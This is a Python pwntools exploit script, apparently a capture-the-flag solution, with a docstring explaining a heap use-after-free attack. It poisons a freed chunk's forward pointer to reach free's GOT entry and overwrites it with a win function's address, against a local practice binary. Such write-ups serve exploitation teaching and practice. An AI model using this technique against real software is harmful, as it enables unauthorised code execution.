#!/usr/bin/env python3

"""
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
ASLR:       Enabled

The exploitation method used here is called use-after-free which is a heap exploitaion method.
Use-after-free occurs when memory is freed but still accessed. Exploiting it can lead to code execution by reusing the memory in unintended ways.

The exploit abuses a use-after-free (UAF) vulnerability by freeing a chunk, editing its metadata(forward pointer) to point to GOT address of free, 
and reallocating it to overwrite free with the address of the win function. Triggering free executes win.
"""

from pwn import *

bin = context.binary = ELF("./uaf")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)


def malloc(size):
    io.sendlineafter(b"exit", f"1 {size}".encode())


def free(index):
    io.sendlineafter(b"exit", f"2 {index}".encode())


def edit(index, data):
    io.sendlineafter(b"exit", f"3 {index} ".encode() + data)


io = start()

malloc(8)
free(0)
edit(0, pack(bin.got.free))
malloc(8)
malloc(8)
edit(2, pack(bin.sym.win))
free(1)


io.interactive()
